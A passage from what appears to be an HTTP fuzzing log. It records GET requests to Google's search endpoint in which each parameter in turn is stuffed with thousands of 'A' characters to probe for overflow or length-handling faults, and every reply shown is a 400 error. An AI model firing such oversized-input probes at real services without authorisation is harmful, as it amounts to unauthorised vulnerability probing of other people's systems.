AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:50 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:51 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:51 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:51 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA